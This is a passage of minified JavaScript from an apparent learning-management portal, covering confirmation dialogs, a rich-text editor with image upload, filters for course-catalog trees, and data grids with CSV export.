a[data-dismiss="modal"]').bind("click",(function(){myportal.app.leavingFromNormalLink=!1})),$("#tl_leavepage_confirm").modal()},confirmCancellation:function(t,e,i,a){t&&$(".tl-modal-header").text(t),$("#tl-modal-body").html(e),$("#tl-confirm-submit").text(myportal.app.translate("ok")),$("#tl-confirm-submit").unbind("click"),$("#tl-confirm-submit").bind("click",(function(){i(a),$("#tl-confirm").modal("hide")})),$("#tl-confirm").modal()},confirmRefresh:function(t,e,i,a){t&&$(".tl-modal-header").text(t),$("#tl-modal-body").html(e),$("#tl-confirm-submit").html(myportal.app.translate("refresh")),$("#tl-confirm-submit").unbind("click"),$("#tl-confirm-submit").bind("click",(function(){i(a),$("#tl-confirm").modal("hide")})),$("#tl-confirm").modal()},confirmReset:function(t,e,i,a,o){t&&$(".tl-modal-header").text(t),$("#tl-modal-body").html(e),$("#tl-confirm-submit").text(myportal.app.translate("reset")).unbind("click"),$("#tl-confirm-submit").bind("click",(function(){void 0!==o?i(a,o):i(a),$("#tl-confirm").modal("hide")})),$("#tl-confirm").modal()},confirmResetRemoveCertification:function(t,e,i,a,o){t&&$(".tl-modal-header-double").text(t),$("#tl-modal-body-double").html(e),$("#tl-confirm-submit-double").text(myportal.app.translate("reset")).unbind("click"),$("#tl-confirm-submit-double2").text(myportal.app.translate("reset-remove-certification")).unbind("click"),$("#tl-confirm-submit-double").bind("click",(function(){i(a),$("#tl-confirm-double").modal("hide")})),$("#tl-confirm-submit-double2").bind("click",(function(){$(a).data("action",o),i(a),$(a).parents("tr").find(".icon-trophy").remove(),$("#tl-confirm-double").modal("hide")})),$("#tl-confirm-double").modal()},saveAsNew:function(t,e,i,a){t&&$(".tl-modal-header").text(t),$("#tl-modal-body").html(e),$("#tl-confirm-submit").removeClass("btn-danger"),$("#tl-confirm-submit").addClass("btn-primary"),$("#tl-confirm-submit").text(myportal.app.translate("save")),$("#tl-confirm-submit").unbind("click"),$("#tl-confirm-submit").bind("click",(function(){i(a)})),$("#tl-confirm").modal()},countdownTextareaFocusin:function(t){t.css("border-radius","4px 4px 0px 4px"),t.css("-moz-border-radius","4px 4px 0px 4px"),t.css("-webkit-border-radius","4px 4px 0px 4px"),t.parent().find(".add-on").css("display","inline-block")},countdownTextareaFocusout:function(t){t.css("border-radius","4px 4px 4px 4px"),t.css("-moz-border-radius","4px 4px 4px 4px"),t.css("-webkit-border-radius","4px 4px 4px 4px"),t.parent().find(".add-on").css("display","none")},countdownTextboxFocusin:function(t){t.css("border-radius","4px 0px 0px 4px"),t.css("-moz-border-radius","4px 0px 0px 4px"),t.css("-webkit-border-radius","4px 0px 0px 4px"),t.parent().find(".add-on").css("display","inline-block")},countdownTextboxFocusout:function(t){t.css("border-radius","4px 4px 4px 4px"),t.css("-moz-border-radius","4px 4px 4px 4px"),t.css("-webkit-border-radius","4px 4px 4px 4px"),t.parent().find(".add-on").css("display","none")},leavePageCheckingUploads:function(t){if(myportal.app.leavingFromNormalLink=!0,!0===myportal.app.isUploading)return myportal.app.confirmLeavePage(myportal.app.translate("active-file-upload"),myportal.app.translate("upload-leave-page"),(function(e){window.location=t}),$(this)),!1;window.location=t},initEditor:function(t){if(t||(t=$("#editor-wysiwyg")),t.length&&("undefined"==typeof initialized||-1==$.inArray(t.attr("id"),initialized))){"undefined"==typeof initialized&&(initialized=new Array),initialized.push(t.attr("id")),void 0===myportal.app.wysiwygEditor&&(myportal.app.wysiwygEditor=new Array),new_editor=$(t).summernote({toolbar:[["style",["style"]],["text",["bold","italic","underline"]],["fontname",["fontname"]],["color",["color"]],["layout",["ul","ol","paragraph"]],["lineheight",["height"]],["undoredo",["undo","redo"]],["table",["table"]],["insert",["link","talentImage","hr"]],["tags",["talentSmartTagsDropdown"]],["misc",["codeview"]]],defaultFontName:"Georgia",fontNames:["Georgia","Arial","Verdana","Source Sans Pro","Droid Sans","Lato","Arvo","Cabin","Lora","PT Sans","Josefin Slab","Droid Serif","Bree Serif","Lobster Two","Open Sans","Oswald","Pacifico","Patua One","Poly","Varela Round","Vollkorn","Lustria","Istok Web","Muli","Nunito","Jura"],fontNamesIgnoreCheck:["Georgia","Arial","Verdana","Source Sans Pro","Droid Sans","Lato","Arvo","Cabin","Lora","PT Sans","Josefin Slab","Droid Serif","Bree Serif","Lobster Two","Open Sans","Oswald","Pacifico","Patua One","Poly","Varela Round","Vollkorn","Lustria","Istok Web","Muli","Nunito","Jura"],codemirror:{mode:"text/html",lineWrapping:!0,lineNumbers:!0,htmlMode:!0,extraKeys:{F11:function(t){t.setOption("fullScreen",!t.getOption("fullScreen"))},Esc:function(t){t.getOption("fullScreen")&&t.setOption("fullScreen",!1)},"Alt-F":"findPersistent"}},prettifyHtml:!1,oninit:function(e){$(t).code(myportal.content.parseFileTags($(t).code())),$(t).hasClass("readability")&&$(".note-editable").addClass("readability"),$(".imagesselect:not(.loaded)").each((function(){var e=t.data("imagesurl"),i=$(this);myportal.app.ajax(e,{type:"post",data:{},success:function(t){var e=$.parseJSON(t);$.each(e,(function(t,e){i.append($("<option></option>").val(t).text(e))})),i.addClass("loaded")}})})),showSelect2&&$("select.imagesselect:not(.loaded)").select2({width:"element",minimumResultsForSearch:10,dropdownAutoWidth:!0}),t.attr("data-uploadimagesurl")&&$(".tl-editor-uploader:not(.loaded)").each((function(){var t=$(this);$(this).fileupload({autoUpload:!0,maxNOF:1,maxFileSize:editorMaxUploadSize,acceptFileTypes:new RegExp(editorAcceptedFileTypes,"i"),previewFileTypes:/none/,disableInputButton:!1,replaceFileInput:!0,add:function(e,i){var a=this,o=$(this),n=i.process((function(){return o.fileupload("process",i)}));n.done((function(){$.blueimp.fileupload.prototype.options.add.call(a,e,i)})),n.fail((function(e){$("#"+t.attr("id")+" .note.error").html("<i class='icon-attention-circled'></i> "+e.files[e.index].error)}))},done:function(e,i){resp=$.parseJSON(i.jqXHR.responseText),setTimeout((function(){i.context.remove()}),200),resp.success?($("#"+$(this).attr("data-selectbox")).append($("<option></option>").val(resp.data.file_id).prop("selected",!0).text(resp.data.filename)),$("#"+$(this).attr("data-selectbox")).change()):$("#"+t.attr("id")+" .note.error").html("<i class='icon-attention-circled'></i> "+resp.data.error)}}),$(this).addClass("loaded")}))},onImageUpload:function(e,i,a){if(!t.attr("data-uploadimagesurl"))return!1;var o=t.data("uploadimagesurl"),n=new FormData;n.append("files",e[0]),myportal.app.ajax(o,{type:"post",data:n,processData:!1,contentType:!1,cache:!1,success:function(t){var e=$.parseJSON(t),o=e.data;e.success?(myportal.app.filescache.fileurls[o.file_id]=o.url,myportal.app.filescache.fileids[decodeURIComponent(o.url)]=o.file_id,a.focus(),i.insertImage(a,decodeURIComponent(o.url))):myportal.app.notify({type:"error",message:o.error})}})}}),myportal.app.wysiwygEditor.push(new_editor),void 0===myportal.app.editor_mode&&(myportal.app.editor_mode=new Array),myportal.app.editor_mode[t.attr("id")]="wysiwyg","editor-wysiwyg"!=t.attr("id")||myportal.content.initial_value?myportal.content.initial_question_value||(myportal.content.initial_question_value=myportal.app.wysiwygEditor[myportal.app.wysiwygEditor.length-1].code()):myportal.content.initial_value=myportal.app.wysiwygEditor[myportal.app.wysiwygEditor.length-1].code(),$("a").each((function(){$(this).attr("href")&&$(this).attr("href").indexOf("javascript:")<0&&"#"!=$(this).attr("href")&&"modal"!=$(this).attr("data-dismiss")&&"tl-confirm-submit"!=$(this).attr("id")&&"tl-footer-secured"!=$(this).attr("id")&&!$(this).hasClass("tl-blanc")&&!$(this).hasClass("dropdown-toggle")&&!$(this).parents(".note-editable").length&&("editor-wysiwyg"!=t.attr("id")||$(this).attr("data-link")?$(this).attr("data-link")||$(this).attr("data-link","blink"):$(this).attr("data-link","alink"))})),$(document).on("click",'[data-link="alink"]',(function(){if(target=$(this).attr("target"),null!=target&&"_blank"==target.toLowerCase())return!0;myportal.app.leavingFromNormalLink=!0;var t=myportal.content.initial_value.replace(/\s/g,""),e=myportal.app.wysiwygEditor[myportal.app.wysiwygEditor.length-1].code().replace(/\s/g,"");return!0===myportal.app.isUploading?(myportal.app.confirmLeavePage(myportal.app.translate("active-file-upload"),myportal.app.translate("upload-leave-page"),(function(t){window.location=t.attr("href")}),$(this)),!1):t!=e?(myportal.app.confirmLeavePage(myportal.app.translate("unsaved-changes"),myportal.app.translate("changes-leave-page"),(function(t){window.location=t.attr("href")}),$(this)),!1):void 0})),$(document).on("click",'[data-link="blink"]',(function(){if(target=$(this).attr("target"),null!=target&&"_blank"==target.toLowerCase())return!0;myportal.app.leavingFromNormalLink=!0;var t=myportal.content.initial_question_value.replace(/\s/g,""),e=myportal.app.wysiwygEditor[myportal.app.wysiwygEditor.length-1].code().replace(/\s/g,"");return!0===myportal.app.isUploading?(myportal.app.confirmLeavePage(myportal.app.translate("active-file-upload"),myportal.app.translate("upload-leave-page"),(function(t){window.location=t.attr("href")}),$(this)),!1):t!=e?(myportal.app.confirmLeavePage(myportal.app.translate("unsaved-changes"),myportal.app.translate("changes-leave-page"),(function(t){window.location=t.attr("href")}),$(this)),!1):void 0})),$(window).bind("beforeunload",(function(t){if(!0!==myportal.app.leavingFromNormalLink&&!0===myportal.app.isUploading)return myportal.app.translate("active-file-upload")})),void 0===myportal.app.editor_mode&&(myportal.app.editor_mode=new Array),myportal.app.editor_mode[t.attr("id")]="wysiwyg"}},escapeHtml:function(t){var e={"&":"&amp;","<":"&lt;",">":"&gt;","'":"&#039;",'"':"&quot;"};return t.replaceAll(/[&<>'"]/g,(function(t){return e[t]}))}}}(),$(document).ready((function(){myportal.app.init(),"undefined"!=typeof enableRelogin&&1==enableRelogin&&(myportal.app.sessionTimer(sessionMaxLifeTime),myportal.app.loadSessionEvents())})),myportal.namespace("myportal.tree"),myportal.tree={init:function(){if(current_filter="",$("#tl-dynamic-tree").length){var t=$("#tl-dynamic-tree").attr("action")?{url:$("#tl-dynamic-tree").attr("action"),data:{mode:"all"}}:null,e=$("#tl-dynamic-tree").attr("action")?null:$.parseJSON($("#tl-dynamic-tree").text());$("#tl-dynamic-tree").dynatree({initAjax:t,children:e,persist:!1,onActivate:function(t){},onClick:function(t,e){if("title"==t.getEventTargetType(e)||"icon"==t.getEventTargetType(e)){if(t.data.href)return window.location=t.data.href,!1;if(!t.data.isFolder&&t.data.children)return t.toggleExpand(),!1}else if("prefix"==t.getEventTargetType(e))return t.toggleExpand(),!1},onLazyRead:function(t){t.appendAjax({url:t.data.ef_url})},onExpand:function(t,e){t&&myportal.content.init()}}),$("#tl-tree-filter")&&$("#tl-tree-filter").on("keyup",(function(){myportal.tree.filter($("#tl-tree-filter").val())})),$(".tl-tag-filter")&&$(document).on("click",".tl-tag-filter",(function(){myportal.tree.tag_filter($(this).attr("data-filter"))})),$("input.search-query").val()&&$("input.search-query").trigger("keyup"),$("#tl-dynamic-tree").show(400,(function(){0==$(".tl-tree-course:visible").length?$(".tl-search-empty-result").show():$(".tl-search-empty-result").hide(),$(".tl-can-clear-input input").trigger("change")}))}$("#tl-course-catalog-tree").length&&(t=$("#tl-course-catalog-tree").attr("action")?{url:$("#tl-course-catalog-tree").attr("action"),data:{mode:"all"}}:null,e=$("#tl-course-catalog-tree").attr("action")?null:$.parseJSON($("#tl-course-catalog-tree").text()),$("#tl-course-catalog-tree").dynatree({initAjax:t,children:e,persist:!1,checkbox:!0,generateIds:!0,onSelect:function(t,e){return t&&e.data.type?changeParametersValues(e.data.type,e.data.key,!0):changeParametersValues(e.data.type,e.data.key,!1),!0},onExpand:function(t,e){e.visit((function(t){t.getLevel()>e.getLevel()&&t.expand(!1),toggleExpanders(t)}))},onClick:function(t,e){if(("title"==t.getEventTargetType(e)||"icon"==t.getEventTargetType(e))&&t.data.type)return $("#dynatree-id-"+t.data.key).closest(".dynatree-checkbox")[0].click(),!0;"checkbox"==t.getEventTargetType(e)&&void 0!==e.originalEvent?(changeParametersValues("categories",t.data.key,!$("#dynatree-id-"+t.data.key).prop("dtnode").isSelected(),!1,!0),$("#dynatree-id-"+t.data.key+" li").length>0&&$("#dynatree-id-"+t.data.key+" li").each((function(){changeParametersValues("categories",$(this).prop("dtnode").data.key,!$("#dynatree-id-"+t.data.key).prop("dtnode").isSelected(),!1,!0)}))):"checkbox"==t.getEventTargetType(e)&&null==e.originalEvent&&(t.expand(!0),changeParametersValues("categories",t.data.key,!0,!1,!1))}}),$("#tl-course-catalog-tree").dynatree("getRoot").visit((function(t){t.expand(!1)})),$("#tl-course-catalog-tree").show()),$("#tl-marketplace-tree").length&&(t=$("#tl-marketplace-tree").attr("action")?{url:$("#tl-marketplace-tree").attr("action"),data:{mode:"all"}}:null,e=$("#tl-marketplace-tree").attr("action")?null:$.parseJSON($("#tl-marketplace-tree").text()),$("#tl-marketplace-tree").dynatree({initAjax:t,children:e,persist:!1,checkbox:!0,generateIds:!0,onSelect:function(t,e){return t&&e.data.type?changeParametersValues(e.data.type,e.data.key,!0):changeParametersValues(e.data.type,e.data.key,!1),!0},onExpand:function(t,e){e.visit((function(t){t.getLevel()>e.getLevel()&&t.expand(!1)})),toggleExpanders(e)},onClick:function(t,e){if(("title"==t.getEventTargetType(e)||"icon"==t.getEventTargetType(e))&&t.data.type)return $("#dynatree-id-"+t.data.key+" .dynatree-checkbox").trigger("click"),!0;"checkbox"==t.getEventTargetType(e)&&void 0!==e.originalEvent?(changeParametersValues("categories",t.data.key,!$("#dynatree-id-"+t.data.key).prop("dtnode").isSelected(),!1,!0),$("#dynatree-id-"+t.data.key+" li").length>0&&$("#dynatree-id-"+t.data.key+" li").each((function(){changeParametersValues("categories",$(this).prop("dtnode").data.key,!$("#dynatree-id-"+t.data.key).prop("dtnode").isSelected(),!1,!0)}))):"checkbox"==t.getEventTargetType(e)&&null==e.originalEvent&&(t.expand(!0),changeParametersValues("categories",t.data.key,!0,!1,!1))}}),$("#tl-marketplace-tree").dynatree("getRoot").visit((function(t){t.expand(!1)})),$("#tl-marketplace-tree").show())},tag_filter:function(t){var e=$("#tl-dynamic-tree").dynatree("getRoot");if(current_filter==t)e.visit((function(t){$(t.li).show()})),current_filter="",$("input.search-query").val(""),setTlmsCookie("cookie_dashboard_search","",{expires:null,path:"/",domain:myEffectiveDomain,secure:!1});else{var i=$.cookie("cookie_dashboard_search")?decodeURIComponent($.cookie("cookie_dashboard_search")).replace(/[&\/\\#,+()$~%.'":;*?<>{}@\^=\[\]\|]+/g,""):"";e.visit((function(e){(!$("<p>"+e.data.title+"</p>").children("span.label").hasClass("label-"+t)||""!=i&&$("<p>"+e.data.title+"</p>").text().toLowerCase().indexOf(i.toLowerCase())<0)&&($(e.li).hide(),e.isLastSibling()&&e.visitParents((function(t){return null!=t.parent}),!1))})),e.visit((function(e){if($("<p>"+e.data.title+"</p>").children("span.label").hasClass("label-"+t)&&(""==i||$("<p>"+e.data.title+"</p>").text().toLowerCase().indexOf(i.toLowerCase())>=0))return e.visitParents((function(t){return $(t.li).show(),null!=t.parent}),!0),!0})),""!=i&&e.visit((function(t){if(0!==t.data.isFolder&&$("<p>"+t.data.title+"</p>").text().toLowerCase().indexOf(i.toLowerCase())>=0)return t.visitParents((function(t){return $(t.li).show(),null!=t.parent}),!0),!0})),current_filter=t}setTlmsCookie("cookie_dashboard_filter",current_filter,{expires:null,path:"/",domain:myEffectiveDomain,secure:!1})},filter:function(t){t=$.trim(t.replace(/[&\/\\#,+()$~%.'":;*?<>{}@\^=\[\]\|]+/g,""));var e=$("#tl-dynamic-tree").dynatree("getRoot");""==t&&(current_filter="",setTlmsCookie("cookie_dashboard_filter","",{expires:null,path:"/",domain:myEffectiveDomain,secure:!1}),$(".tl-microstats-section").length&&$(".tl-microstats-section .item").removeClass("active")),e.visit((function(e){($("<p>"+e.data.title+"</p>").text().toLowerCase().indexOf(t.toLowerCase())<0||""!=current_filter&&!$("<p>"+e.data.title+"</p>").children("span.label").hasClass("label-"+current_filter))&&($(e.li).hide(),e.isLastSibling()&&e.visitParents((function(t){return t.isLastSibling()&&$(t.li).hide(),null!=t.parent}),!1))})),e.visit((function(e){if($("<p>"+e.data.title+"</p>").text().toLowerCase().indexOf(t.toLowerCase())>=0&&(""==current_filter||$("<p>"+e.data.title+"</p>").children("span.label").hasClass("label-"+current_filter)))return e.visitParents((function(t){return $(t.li).show(),null!=t.parent}),!0),!0})),e.visit((function(e){if(0!==e.data.isFolder&&$("<p>"+e.data.title+"</p>").text().toLowerCase().indexOf(t.toLowerCase())>=0)return e.visitParents((function(t){return $(t.li).show(),null!=t.parent}),!0),!0})),setTlmsCookie("cookie_dashboard_search",encodeURIComponent(t),{expires:null,path:"/",domain:myEffectiveDomain,secure:!1})}},myportal.namespace("myportal.form"),myportal.form={init:function(){$(".tl-form")&&$(".tl-form").bind("submit",(function(){$(this).find("input[type=submit]").next(".dropdown-toggle").addClass("disabled"),$(this).find("input[type=submit]").button("loading")}))}},myportal.namespace("myportal.grid"),myportal.grid=function(){var t=2e3,e={};return{create:function(i,a,o,n,r,s,l,c,d,p,u,h,f,m,g){e[i]=g,$.fn.DataTable.ext.errMode="none",$("#"+i).on("error.dt",(function(t,e,i,a){var o="",n=myportal.app.translate("dtable-error");e.jqXHR.responseJSON.message&&(o=decodeURIComponent(e.jqXHR.responseJSON.message)),o===n?myportal.app.notify({type:"error",message:n}):myportal.app.error(a)})).DataTable({info:"undefined"==typeof isMobile||!isMobile,lengthChange:!1,serverSide:!0,orderClasses:!1,searchDelay:400,columns:a,order:r,displayStart:s,pageLength:l,deferLoading:c,ajax:{url:n,type:"POST",dataFilter:function(t){var a=JSON.parse(t);return a?(a.customPagination&&(e[i]=a.customPagination),t):t}},dom:o,pagingType:"dropdown",search:{search:f},autoWidth:"grid_course_catalog"!=i&&"tl-list-coupons"!=i&&"grid_marketplace"!=i,stateSave:"tl-domains-grid"==i,stateLoadParams:function(t,e){if("tl-domains-grid"!=i||"tl-domains-grid"==i&&null==$.cookie("cookie_visited_domain_info"))return!1;"tl-domains-grid"==i&&null!=$.cookie("cookie_visited_domain_info")&&setTlmsCookie("cookie_visited_domain_info",null,{expires:-1,path:"/",domain:myAdminDomain,secure:!1})},initComplete:function(t,e){function a(t){t.find(".dataTables_filter label").addClass("tl-can-clear-input").addClass(""!==f?"show-clear-btn":"").append('<div class="tl-clear-input-btn"><i class="icon-remove"></i></div>')}"grid_course_catalog"==i?a($(".tl-grid-course-catalog")):"grid_marketplace"==i?a($(".tl-grid-marketplace")):((t._iRecordsDisplay>0||f.length>0)&&$('<div class="dropdown dropup tl-grid-filtering-wrapper pull-right hide"></div>').insertAfter($("#"+i).siblings(".tl-grid-footer").find(".dataTables_filter")),0==f.length&&t._iRecordsDisplay<=3?($("#"+i).siblings(".tl-grid-footer").find(".dataTables_filter").hide(),$("#"+i).next(".tl-grid-footer").find(".tl-grid-footer-tools").css("margin-top","-8px"),$("#"+i).next(".tl-grid-footer").find(".tl-grid-filtering-wrapper").css("margin-top","-11px")):("tl-ilt-list-sessions"===i&&$("#tl-ilt-list-sessions").siblings(".tl-grid-footer").attr("style","display: block !important"),a($("#"+i).siblings(".tl-grid-footer"))),"tl-invoices-grid"!=i&&"tl-list-language-overrides"!=i&&"tl-branch-reports-course-learners"!=i&&"tl-group-reports-course-learners"!=i||$('<a id="tl-cancel-export-modal" class="none-decoration pull-right hide" href="javascript:void(0);" style="margin: 10px 8px 0px 3px;" title="'+myportal.app.translate("cancel")+'"><i class="icon-remove tl-icon20"></i></a><div id="tl-loading-export-modal" class="pull-right hide"><img src="/pages/images/loading-small.gif" alt="'+myportal.app.translate("creating-export")+'" title="'+myportal.app.translate("creating-export")+'" class="tl-loader-small"/></div>').insertAfter($("#"+i).siblings(".tl-grid-footer").find(".tl-grid-footer-tools"))),0==d&&$("#"+i).css("margin-bottom","3px").next(".tl-grid-footer").hide();var o=$("#"+i),n=!1;function r(){o.find(".tl-table-operations-trigger").length>0&&!n&&void 0===isTouchDevice()&&(n=!0,o.on("mouseenter","tr",(function(t){$(this).find(".tl-table-operations-trigger").length>0&&$(this).find(".tl-table-operations-trigger").addClass("active")})).on("mouseleave","tr",(function(t){$(this).find(".tl-table-operations-trigger").length>0&&$(this).find(".tl-table-operations-trigger").removeClass("active")})).on("mousemove","tr",(function(t){$(this).find(".tl-table-operations-trigger").length>0&&!$(this).find(".tl-table-operations-trigger").hasClass("active")&&$(this).find(".tl-table-operations-trigger").addClass("active")}))),n&&isTouchDevice()&&o.unbind("mouseenter").unbind("mouseleave")}r(),o.length>0&&o.DataTable().on("draw.dt",debounce((function(t){$(t.target).find(".tl-table-operations-trigger").length>0&&r()}),200)),$(window).on("resize",debounce((function(t){r()}),200))},fnInfoCallback:function(t,e,i,a,o,n){return 0!=m?m(t,e,i,a,o,n):n},drawCallback:function(e){if($("th.tl-table-operations-cell").each((function(){$(this).css("width","")})),$("td.tl-table-operations-cell").each((function(){var t=$(this).html();$(this).find("i").filter((function(){return"none"!==window.getComputedStyle(this).display})).length>1?$(this).html('<div class="tl-table-operations-trigger touchable"><i class="icon-ellipsis-h tl-table-operations-icon"  ></i><div class="tl-table-operations touchable">'+t+"</div></div>"):$(this).html('<div class="tl-table-operations">'+t+"</div>")})),0!=p&&p(),myportal.grid.getCustomPagination(i)){var a=myportal.grid.getCustomPagination(i);e._iRecordsDisplay=a.total,e._iDisplayStart=a.start}if(0!=d){var o=e.sTableId+"_info";Math.ceil(e._iRecordsDisplay/e._iDisplayLength)<=1?$("#"+i).next(".tl-grid-footer").find(".dataTables_paginate").hide():$("#"+i).next(".tl-grid-footer").find(".dataTables_paginate").show(),0==e._iRecordsDisplay?$("#"+i).next(".tl-grid-footer").find(".tl-grid-footer-tools").hide():$("#"+i).next(".tl-grid-footer").find(".tl-grid-footer-tools").show(),0==e._iRecordsDisplay?$("#"+o).hide():$("#"+o).show(),e._iRecordsDisplay>10&&e._iDisplayLength<e._iRecordsDisplay&&-1!=e._iDisplayLength&&e._iDisplayLength<t?$("#"+o+" .tl-grid-size-more").show():$("#"+o+" .tl-grid-size-more").hide(),e._iDisplayLength>10||-1==e._iDisplayLength||e._iDisplayLength==t?$("#"+o+" .tl-grid-size-less").show():$("#"+o+" .tl-grid-size-less").hide()}("tl-users-grid"==i&&$("#tl-users-grid tbody").hasClass("gridUsersTableBody")||"grid_course_catalog"==i&&$("#grid_course_catalog tbody").hasClass("gridCourseCatalog")||"grid_marketplace"==i&&$("#grid_marketplace tbody").hasClass("gridMarketplace"))&&$("#"+o+" .tl-grid-size-less, #"+o+" .tl-grid-size-more").hide(),"grid_course_catalog"==i&&$("#grid_course_catalog tbody").hasClass("gridCourseCatalog")&&$(".tl-grid-catalog-course-title").css("background-color",myportal.content.gridModeCourseNameBackground),"grid_marketplace"==i&&$("#grid_marketplace tbody").hasClass("gridMarketplace")&&$(".tl-grid-marketplace-course-title").css("background-color",myportal.content.gridModeCourseNameBackground),e.iDraw>=2&&("tl-survey-questions"==i||"tl-test-questions"==i||"tl-list-random-question-pool"==i)&&e._iRecordsDisplay>3&&($("#"+i).siblings(".tl-grid-footer").find(".dataTables_filter").show(),$("#"+i).next(".tl-grid-footer").find(".tl-grid-footer-tools").css("margin-top","1px"),0==$("#"+i).siblings(".tl-grid-footer").find(".dataTables_filter label .tl-clear-input-btn").length&&$("#"+i).siblings(".tl-grid-footer").find(".dataTables_filter label").append('<div class="tl-clear-input-btn"><i class="icon-remove"></i></div>'))},language:{info:myportal.app.translate("grid-start-end-total")+' <a class="tl-grid-size-less" title="'+myportal.app.translate("grid-less-results")+'" '+(window.testEnvActive?"data-test-id='grid-show-less'":"")+'></a><a class="tl-grid-size-more" title="'+myportal.app.translate("grid-more-results")+'" '+(window.testEnvActive?"data-test-id='grid-show-more'":"")+"></a>",search:"",infoEmpty:"",infoFiltered:"",zeroRecords:"-",thousands:".",paginate:{next:"",previous:""},aria:{sortAscending:"",sortDescending:"",paginate:{next:myportal.app.translate("next"),previous:myportal.app.translate("previous")}}},buttons:[{text:'<i class="icon-download tl-icon19" '+(window.testEnvActive?"data-test-id='datatable-download-btn'":"")+"></i>",titleAttr:myportal.app.translate("save-as-csv"),action:function(t,e,a,o){if(!a.hasClass("disabled")){a.addClass("disabled");var n=e.context[0]._iRecordsDisplay>gridExportLimit?gridExportLimit:e.context[0]._iRecordsDisplay;n>=gridExportProgressThreshold&&("tl-invoices-grid"==i||"tl-list-language-overrides"==i||"tl-branch-reports-course-learners"==i||"tl-group-reports-course-learners"==i?$("#tl-loading-export-modal, #tl-cancel-export-modal").show():$("#tl-export-to-csv-modal").modal({keyboard:!1,backdrop:"static"}),$("#tl-export-to-csv-token").text((new Date).getTime()));var r=e.ajax.params();if(void 0===r){var s,l=e.order();s=l.length?[{column:l[0][0].toString(),dir:l[0][1]}]:[],r={columns:[],order:s,search:{value:e.search(),regex:"false"}},e.context[0].aoColumns.forEach((function(t){r.columns.push({data:t.mData.toString(),name:t.sName,searchable:t.bSearchable.toString(),orderable:t.bSortable.toString(),search:{value:"",regex:"false"}})}))}myportal.grid.exportAsCsv(i,r,void 0===e.ajax.json()?"":e.ajax.json().extraArguments,n,Math.ceil(n/gridExportChunkSize),1,u,h)}}}]}),$("#"+i).css("width","100%"),$("#"+i).on("processing.dt",(function(t,e,i){i?$("#tl-loading-pane").show():$("#tl-loading-pane").hide()})),$(document).off("click","#"+i+"_info .tl-grid-size-less"),$(document).on("click","#"+i+"_info .tl-grid-size-less",(function(){var e=$("#"+i).DataTable(),a=e.page.info(),o=$(this),n=o.attr("data-custom-value")?o.attr("data-custom-value"):a.length;n==t||-1==a.length?e.page.len(80).draw():Math.round(n/2)<10?e.page.len(10).draw():e.page.len(Math.round(n/2)).draw()})),$(document).off("click","#"+i+"_info .tl-grid-size-more"),$(document).on("click","#"+i+"_info .tl-grid-size-more",(function(){var e=$("#"+i).DataTable(),a=e.page.info(),o=$(this),n=o.attr("data-custom-value")?o.attr("data-custom-value"):a.length;n<80?e.page.len(2*n).draw():a.recordsDisplay>=t?e.page.len(t).draw():e.page.len(-1).draw()})),$(".tl-grid-footer").find("input").attr("placeholder",myportal.app.translate("search")).attr("data-lpignore",!0).attr("data-form-type","other").addClass("tl-grid-search-input").placeholder(),$(".tl-grid-footer .tl-grid-search-input").parent("label").addClass("tl-can-clear-input"),window.testEnvActive&&$(".tl-grid-footer").find("input").attr("data-test-id","grid-search-input"),$(".tl-grid-course-catalog").find("input").attr("placeholder",myportal.app.translate("search-courses")).placeholder(),$(".tl-grid-marketplace").find("input").attr("placeholder",myportal.app.translate("search-courses")).placeholder(),checkOverflow(document.querySelector(".dataTables_wrapper"))&&$(".dataTables_wrapper").addClass("dataTables_wrapper-overflowed")},deleteRow:function(t){$(t).prop("onclick",null),myportal.app.ajax($(t).data("action"),{type:"POST",data:{myToken:myToken},success:function(e){myportal.app.parseResponse(e),$("#"+$(t).closest("table")[0].id).DataTable().row($(t).closest("tr")[0]).remove().draw(!1)}})},exportAsCsv:function(t,e,i,a,o,n,r,s){myportal.app.ajax(r,{type:"POST",data:{parameters:void 0===e?"":e,extraParameters:""!=i&&Object.keys(i).length>0?i:"",currentChunk:n,myToken:myToken},success:function(){$("#tl-cancel-export").hasClass("disabled")||$("#tl-cancel-export-modal").hasClass("disabled")?myportal.grid.cancelExport(r,t):n<o?myportal.grid.exportAsCsv(t,e,i,a,o,n+1,r,s):(window.location.href=s.replace("##token##",$("#tl-export-to-csv-token").text()),myportal.grid.hideExportModal(a,t))},error:function(e){var i="",a=myportal.app.translate("dtable-error");if(e.responseText){var o=$.parseJSON(e.responseText);o.message&&(i=decodeURIComponent(o.message))}myportal.grid.closeExportModal(t),i===a?myportal.app.notify({type:"error",message:a}):myportal.app.error("Oops, something went wrong! Please try again")}})},closeExportModal:function(t){$("#"+t).siblings(".tl-grid-footer").find(".tl-grid-footer-tools div a:first").removeClass("disabled"),$("#tl-export-to-csv-token").text(""),myportal.grid.hideExportModalWindow(t)},hideExportModalWindow:function(t){"tl-invoices-grid"==t||"tl-list-language-overrides"==t||"tl-branch-reports-course-learners"==t||"tl-group-reports-course-learners"==t?($("#tl-loading-export-modal, #tl-cancel-export-modal").hide(),$("#tl-cancel-export-modal").removeClass("disabled")):$("#tl-export-to-csv-modal").modal("hide")},hideExportModal:function(t,e){t>=gridExportProgressThreshold&&(myportal.grid.exportInterval=window.setInterval((function(){$.cookie("export_grid_to_csv")==$("#tl-export-to-csv-token").text()&&(setTlmsCookie("export_grid_to_csv",null,{expires:-1,path:"/",domain:myEffectiveDomain,secure:!1}),$("#tl-export-to-csv-token").text(""),myportal.grid.hideExportModalWindow(e),window.clearInterval(myportal.grid.exportInterval),myportal.grid.exportInterval="")}),1e3)),$("#"+e).siblings(".tl-grid-footer").find(".tl-grid-footer-tools div a:first").removeClass("disabled")},cancelExport:function(t,e){myportal.app.ajax(t,{type:"POST",data:{cancel:"1",myToken:myToken},success:function(){myportal.grid.closeExportModal(e)}})},getThresholdToHideSearch:function(){return 3},getCustomPagination:function(t){return e[t]}}}(),myportal.namespace("myportal.matrix"),myportal.matrix=function(){var t=[10,20,40,80,160],e=[20,40,80],i=!1;return myportal.matrix.ajaxRequestInProgress=!1,{create:function(a,o,n,r,s,l,c,d,p,u,h,f,m,g,v,y,b,w,x,C,k,S){function T(){var t=$(".tl-matrix-header .tl-matrix-search-input");t.val().length>=b||""==t.val()?t.tooltip("hide"):0==t.siblings(".tooltip").length&&t.tooltip("show")}function _(t){$(".tl-matrix-column-info-wrapper").remove();var i=0==t._iColRecordsDisplay?" hide":"",a=window.testEnvActive?'data-test-id="matrix-show-more-less-columns"':"",o=t._iRecordsDisplay>t._iSmallControlsThreshold||t._iColRecordsDisplay>t._iSmallControlsThreshold?" 